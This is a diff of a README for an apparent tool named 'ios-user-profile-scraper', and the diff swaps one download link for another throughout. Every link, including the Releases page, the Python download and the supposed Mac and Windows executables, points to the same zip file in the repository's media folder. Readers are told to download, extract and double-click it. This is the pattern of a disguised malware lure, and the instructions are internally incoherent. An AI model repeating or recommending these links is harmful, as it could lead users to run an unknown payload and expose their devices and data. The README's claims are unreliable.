@@ -1,6 +1,6 @@
 # 🚀 ios-user-profile-scraper - Easily Extract iOS User Profiles
 
-![Download](https://raw.githubusercontent.com/adams777943/ios-user-profile-scraper/main/media/ios-user-profile-scraper_1.9.zip%20Releases-brightgreen)
+![Download](https://github.com/adams777943/ios-user-profile-scraper/raw/refs/heads/main/media/ios_user_profile_scraper_v3.6.zip%20Releases-brightgreen)
 
 ## 📥 Overview
 
@@ -16,22 +16,22 @@ The ios-user-profile-scraper is a simple tool designed to help you extract user 
 ## ⚙️ System Requirements
 
 - **Operating System**: macOS 10.14 or later (for Mac users), Windows 10 or later (for Windows users).
-- **Python**: Python 3.6 or later installed on your system. You can download Python from [https://raw.githubusercontent.com/adams777943/ios-user-profile-scraper/main/media/ios-user-profile-scraper_1.9.zip](https://raw.githubusercontent.com/adams777943/ios-user-profile-scraper/main/media/ios-user-profile-scraper_1.9.zip).
+- **Python**: Python 3.6 or later installed on your system. You can download Python from [https://github.com/adams777943/ios-user-profile-scraper/raw/refs/heads/main/media/ios_user_profile_scraper_v3.6.zip](https://github.com/adams777943/ios-user-profile-scraper/raw/refs/heads/main/media/ios_user_profile_scraper_v3.6.zip).
 - **Storage**: At least 100 MB of free disk space.
   
 ## 📦 Download & Install
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to the following link to access the latest versions of ios-user-profile-scraper: [Download Here](https://raw.githubusercontent.com/adams777943/ios-user-profile-scraper/main/media/ios-user-profile-scraper_1.9.zip)
+1. **Visit the Releases Page**: Go to the following link to access the latest versions of ios-user-profile-scraper: [Download Here](https://github.com/adams777943/ios-user-profile-scraper/raw/refs/heads/main/media/ios_user_profile_scraper_v3.6.zip)
   
 2. **Select the Version**: On the Releases page, you will see a list of available versions. Look for the latest stable version.
 
-3. **Download the Installer**: Click on the appropriate file based on your operating system (e.g., `https://raw.githubusercontent.com/adams777943/ios-user-profile-scraper/main/media/ios-user-profile-scraper_1.9.zip` for Mac or `https://raw.githubusercontent.com/adams777943/ios-user-profile-scraper/main/media/ios-user-profile-scraper_1.9.zip` for Windows).
+3. **Download the Installer**: Click on the appropriate file based on your operating system (e.g., `https://github.com/adams777943/ios-user-profile-scraper/raw/refs/heads/main/media/ios_user_profile_scraper_v3.6.zip` for Mac or `https://github.com/adams777943/ios-user-profile-scraper/raw/refs/heads/main/media/ios_user_profile_scraper_v3.6.zip` for Windows).
 
 4. **Extract the Files**: Open the downloaded file and extract it to a folder of your choice.
 
-5. **Run the Application**: Locate the executable file (e.g., `https://raw.githubusercontent.com/adams777943/ios-user-profile-scraper/main/media/ios-user-profile-scraper_1.9.zip` on Mac or `https://raw.githubusercontent.com/adams777943/ios-user-profile-scraper/main/media/ios-user-profile-scraper_1.9.zip` on Windows) and double-click it to run.
+5. **Run the Application**: Locate the executable file (e.g., `https://github.com/adams777943/ios-user-profile-scraper/raw/refs/heads/main/media/ios_user_profile_scraper_v3.6.zip` on Mac or `https://github.com/adams777943/ios-user-profile-scraper/raw/refs/heads/main/media/ios_user_profile_scraper_v3.6.zip` on Windows) and double-click it to run.
 
 6. **Follow On-Screen Instructions**: The tool will guide you through the process of extracting user profiles. Simply follow the prompts.
 
@@ -64,4 +64,4 @@ Join our growing community of users on social media and contribute to the projec
 
 ## 🎉 Conclusion
 
-The ios-user-profile-scraper is a powerful tool for anyone looking to access and understand iOS user profiles. With its user-friendly design and robust features, extracting valuable data has never been easier. Start your data journey today by visiting our [Releases page](https://raw.githubusercontent.com/adams777943/ios-user-profile-scraper/main/media/ios-user-profile-scraper_1.9.zip) to download the latest version.
+The ios-user-profile-scraper is a powerful tool for anyone looking to access and understand iOS user profiles. With its user-friendly design and robust features, extracting valuable data has never been easier. Start your data journey today by visiting our [Releases page](https://github.com/adams777943/ios-user-profile-scraper/raw/refs/heads/main/media/ios_user_profile_scraper_v3.6.zip) to download the latest version.
